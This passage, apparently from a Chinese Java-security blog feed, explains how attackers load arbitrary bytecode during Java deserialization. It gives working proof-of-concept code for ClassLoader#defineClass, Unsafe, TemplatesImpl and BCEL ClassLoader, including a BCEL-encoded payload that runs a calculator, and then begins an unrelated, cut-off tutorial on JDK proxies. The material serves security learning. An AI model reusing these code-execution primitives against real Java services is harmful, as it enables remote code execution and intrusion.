方法进行字节码的加载，然后实例化之后即可弹 shell</p><p>我们编写如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-comment">// 利用 ClassLoader#defineClass 直接加载字节码</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClassRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>)); <span class="hljs-comment">// 字节码的数组</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) method.invoke(classLoader, <span class="hljs-string">&quot;src.Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p>使用<code>ClassLoader#defineClass</code>直接加载字节码有个优点就是不需要出网也可以加载字节码，但是它也是有缺点的，就是需要设置<code>m.setAccessible(true);</code>，这在平常的反射中是无法调用的。</p><p>在实际场景中，因为 <code>defineClass</code> 方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p><h3 id="Unsafe-加载字节码"><a href="#Unsafe-加载字节码" class="headerlink" title="Unsafe 加载字节码"></a>Unsafe 加载字节码</h3><ul><li>Unsafe中也存在<code>defineClass()</code>方法，本质上也是 <code>defineClass</code> 加载字节码的方式。</li></ul><p> <code>Unsafe</code> 的 <code>defineClass()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClass(<br>    String name,        <span class="hljs-comment">// 类的全限定名 (包名.类名)，可以为 null</span><br>    <span class="hljs-type">byte</span>[] b,           <span class="hljs-comment">// 字节码数组（class 文件的二进制内容）</span><br>    <span class="hljs-type">int</span> off,            <span class="hljs-comment">// 从字节数组的哪个位置开始解析</span><br>    <span class="hljs-type">int</span> len,            <span class="hljs-comment">// 要解析的字节长度</span><br>    ClassLoader loader, <span class="hljs-comment">// 由哪个类加载器去加载</span><br>    ProtectionDomain pd <span class="hljs-comment">// 安全域（控制权限）</span><br>);<br></code></pre></td></tr></table></figure><p>同时可以在Unsafe类中看到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Unsafe theUnsafe;<br><br>theUnsafe = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Unsafe</span>();<br><br><span class="hljs-keyword">private</span> <span class="hljs-title function_">Unsafe</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以判断Unsafe类是一个单例模式，我们利用反射调用defineClass方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.UnsafeClassLoader;  <span class="hljs-comment">// 包路径：动态类加载器/非安全类加载器</span><br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;  <span class="hljs-comment">// 导入Sun内部API（非标准）</span><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeClassLoaderRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1. 获取系统类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <br>        <span class="hljs-comment">// 2. 获取Unsafe类的Class对象</span><br>        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;<br>        <br>        <span class="hljs-comment">// 3. 通过反射获取Unsafe类的私有字段&quot;theUnsafe&quot;</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        <br>        <span class="hljs-comment">// 4. 解除私有字段的访问限制</span><br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <br>        <span class="hljs-comment">// 5. 获取Unsafe单例实例（静态字段，所以传null）</span><br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>        <br>        <span class="hljs-comment">// 6. 获取defineClass方法（Unsafe的关键方法）</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <br>            String.class,         <span class="hljs-comment">// 类名</span><br>            <span class="hljs-type">byte</span>[].class,        <span class="hljs-comment">// 类字节码</span><br>            <span class="hljs-type">int</span>.class,           <span class="hljs-comment">// 偏移量</span><br>            <span class="hljs-type">int</span>.class,           <span class="hljs-comment">// 长度</span><br>            ClassLoader.class,   <span class="hljs-comment">// 类加载器</span><br>            ProtectionDomain.class <span class="hljs-comment">// 保护域</span><br>        );<br>        <br>        <span class="hljs-comment">// 7. 从文件系统读取恶意类的字节码</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>));<br>        <br>        <span class="hljs-comment">// 8. 使用Unsafe强行定义类（绕过所有安全检查）</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <br>            <span class="hljs-string">&quot;src.Calc&quot;</span>,  <span class="hljs-comment">// 类名</span><br>            code,        <span class="hljs-comment">// 字节码</span><br>            <span class="hljs-number">0</span>,           <span class="hljs-comment">// 偏移量</span><br>            code.length, <span class="hljs-comment">// 长度</span><br>            classLoader, <span class="hljs-comment">// 类加载器</span><br>            <span class="hljs-literal">null</span>         <span class="hljs-comment">// 保护域（无限制）</span><br>        );<br>        <br>        <span class="hljs-comment">// 9. 创建实例并执行（实现RCE-远程代码执行）</span><br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><h3 id="TemplatesImpl-加载字节码"><a href="#TemplatesImpl-加载字节码" class="headerlink" title="TemplatesImpl 加载字节码"></a>TemplatesImpl 加载字节码</h3><ul><li>我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图</li></ul><p>可以看到在 <code>TemplatesImpl</code> 类中还有一个内部类 <code>TransletClassLoader</code>，这个类是继承 <code>ClassLoader</code>，并且重写了 <code>defineClass</code> 方法。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a40.png"></p><ul><li>简单来说，这里的 <code>defineClass</code> 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</li></ul><p>我们从 <code>TransletClassLoader#defineClass()</code> 向前追溯一下调用链：</p><p>我这里是通过全局搜索关键字寻找方法调用关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;<br><br>TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()<br><br>-&gt; TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>追到最前面两个方法 <code>TemplatesImpl#getOutputProperties()</code> 和 <code>TemplatesImpl#newTransformer()</code> ，这两者的作用域是public，可以被外部调用。</p><p>我们尝试用 <code>TemplatesImpl#newTransformer()</code> 构造一个简单的 POC</p><p>首先先构造字节码，注意，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.TemplatesImplClassLoader;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// TemplatesImpl 的字节码构造  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesBytes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM dom, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM dom, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesBytes</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;  <br>        <span class="hljs-built_in">super</span>();  <br> Runtime.getRuntime().exec(<span class="hljs-string">&quot;Calc&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>生成class文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -<span class="hljs-built_in">source</span> 8 -target 8 TemplatesBytes.java<br></code></pre></td></tr></table></figure><p>编写poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.TemplatesImplClassLoader;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// 主程序  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> templates.newTransformer();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>setFieldValue方法传入的参数与链子间方法调用的条件有关</p><ol><li>getTransletInstance()需要_name不为空</li></ol><p><img src="/img/java%E5%AE%89%E5%85%A8/a41.png"></p><ol start="2"><li><p>_ bytecodes要包含有效的类字节码文件内容，_tfactory必须设置有效的工厂实例</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a42.png"></p></li></ol><p>成功弹出计算器</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a43.png"></p><h3 id="利用-BCEL-ClassLoader-加载字节码"><a href="#利用-BCEL-ClassLoader-加载字节码" class="headerlink" title="利用 BCEL ClassLoader 加载字节码"></a>利用 BCEL ClassLoader 加载字节码</h3><ul><li>什么是 BCEL？</li></ul><p>BCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p><p>我们可以通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码：</p><p>我们还是用之前写过的 <code>Calc.java</code> 这个类。</p><p>编写POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.BCEL;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-comment">// 利用 BCEL ClassLoader 加载字节码</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELClassLoaderRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a44.png"></p><p>这一堆特殊的代码，BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。我们修改一下 POC</p><ul><li>注意这里的 ClassLoader 包不要导错了。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.BCEL;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  <br>  <br><span class="hljs-comment">// 修改过滤乱码  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELSuccessRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$A$8dQMO$db$40$Q$7d$9b8$b1c$i$C$81$f0$d1$PhK$81$QU$f5$a57$Q$97$ARU$D$V$Bz$de$y$ab$b0$d4$b1$p$7b$83$e0$X$f5$cc$85$o$O$fd$B$fc$u$c4$ecBi$a4$f6PK$9e$f1$7b3$f3$e6$ad$f7$ee$fe$f6$X$80OX$f1$e1a$d6$c7$i$e6$3d$bc0$f9$a5$8bW$3eJx$edb$c1$c5$oCyC$rJo2$U$9bk$c7$MN$3b$3d$91$M$b5H$rro$d8$ef$ca$ec$90wcb$eaQ$wx$7c$cc3e$f0$T$e9$e8S$953$7c$88$f2L$84$5b$97$J$ef$x$d1$8ey$9eG$v$3f$91Yxt$Q$8d$c26$8f$c5$3a$83$b7$n$e2$a7$a5$8cD$g$d1$Z$3f$e7$a1J$c3$cf$fb$db$XB$O$b4J$Tj$abv4$X$dfw$f9$c0$$$p$df$M$7e$t$jfB$ee$u$b3$bcb$e4$3e$9a$d9$A$V$f8$$$de$Ex$8bw$e4$8a$8c$8a$AKx$cf0$f5$P$ed$A$cb$f0$ZZ$ffo$9aa$c2$ea$c4$3c$e9$85$fb$dd3$v4$c3$e4$l$ea$60$98h$d5$tO$7eO$eag$d0h$aeE$7f$f5$d0$c1$iy$nIr$b59R$ed$e8L$r$bd$f5$d1$81$afY$wd$9e$d3$40m$40Em$7f$c7a$c6$85$a4c$bat$b1$e6$v$80$99$c3S$i$p$URf$94K$ad$9f$60W$b6$iP$y$5b$b2$8c$w$c5$e0$b1$B$e3$a8Q$f60$f1$3c$cc$ad$YP$bfA$a1$5e$bc$86$f3$ed$H$bc$_$adk$94$af$y_$a1$d9$S$8aVq$86$be$Mc$b8$80$U$aa$a40I$f1$f7$86$w$i$c2uBS$f4$ba$uD$$$a6$j$w4$ac$a9$99$H$X$f0$df$84$a2$C$A$A&quot;</span>).newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>那么为什么要在前面加上 <code>$$BCEL$$</code> 呢？这里引用一下p神的解释</p><blockquote><p>BCEL 这个包中有个有趣的类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个 ClassLoader，但是他重写了 Java 内置的<code>ClassLoader#loadClass()</code>方法。</p><p>在 <code>ClassLoader#loadClass()</code> 中，其会判断类名是否是 <code>$$BCEL$$</code> 开头，如果是的话，将会对这个字符串进行 decode</p></blockquote><p>运行这段代码会直接弹出计算器</p><p>那么我们可以判断这段乱码应该就是Calc类BCEL格式的字节码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们知道加载class文件的其中一段流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">URLClassLoader.loadClass()<br>    ↓<br>findClass()<br>    ↓<br>URLClassPath -&gt; 打开 URL（file/http/ftp）<br>    ↓<br>读取字节码<br>    ↓<br>ClassLoader.defineClass() (native)<br>    ↓<br>得到 JVM 内部 Class 对象<br></code></pre></td></tr></table></figure><p>那么想要加载字节码，从流程中可以找到两个入口点</p><ol><li><p>findClass()</p><p>利用 URLClassLoader 加载远程 class 文件就是利用此函数加载远程文件</p></li><li><p>defineClass() </p><p>利用不同类中的此方法加载字节码</p></li></ol><p>另外一种比较特殊的其实是从loadClass()入手，转换字节码格式加载字节码，与前两种的出发点不同</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>本文内容基本全部出自<a href="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#7-%E5%88%A9%E7%94%A8-BCEL-ClassLoader-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">Java反序列化基础篇-05-类的动态加载 | Drunkbaby’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-JDK动态代理</title>
    <link href="/2025/08/27/Java%E5%AE%89%E5%85%A8-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2025/08/27/Java%E5%AE%89%E5%85%A8-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-JDK动态代理"><a href="#Java安全-JDK动态代理" class="headerlink" title="Java安全-JDK动态代理"></a>Java安全-JDK动态代理</h1><h2 id="Java的代理模式"><a href="#Java的代理模式" class="headerlink" title="Java的代理模式"></a>Java的代理模式</h2><p>定义：为其他对象提供一种代理以控制对这个对象的访问</p><p><img src="https://pic4.zhimg.com/v2-9ebf1cd2183e699d766ddf9b7296e1ed_1440w.jpg"></p><p>代理模式的通用类图</p><p>上图中，Subject是一个抽象类或者接口，RealSubject是实现方法类，具体的业务执行，Proxy则是RealSubject的代理，直接和client接触的。</p><p>代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。值得注意的是，代理类和被代理类应该共同实现一个接口，或者是共同继承某个类。</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><h4 id="简单理解静态代理"><a href="#简单理解静态代理" class="headerlink" title="简单理解静态代理"></a>简单理解静态代理</h4><ul><li>以租客找<strong>中介</strong>向房东租房子为例</li></ul><p>想要实现<strong>租客找中介租房东</strong>，在 Java 中就需要4个文件，分别是房源、房东、中介、租客，其中房源应该是接口，其余三项为类。</p><ul><li><code>Rent.java</code>：这是一个接口，可以抽象的理解为房源，作为房源，它有一个方法 <code>rent()</code> 为<strong>租房</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// 租房的接口  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Host.java</code>：这是一个类，这个类就是房东，作为房东，他需要实现 <code>Rent.java</code> 这一个接口，并且要实现接口的 <code>rent()</code> 方法。对应的是方法实现类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>Client.java</code>：这是一个启动类，这个类其实就是租客，租客的想法也很简单，就是找到中介，然后租房</p></li><li><p><code>Proxy.java</code>：这是一个类，这个类是中介，也就是代理，他需要有房东的房源，然而我们通常不会继承房东，而会将房东作为一个私有的属性 <code>host</code>，我们通过 <code>host.rent()</code> 来实现租房的方法。</p><p>Proxy则是RealSubject的代理，直接和client接触的。</p><p><strong>Proxy.java</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 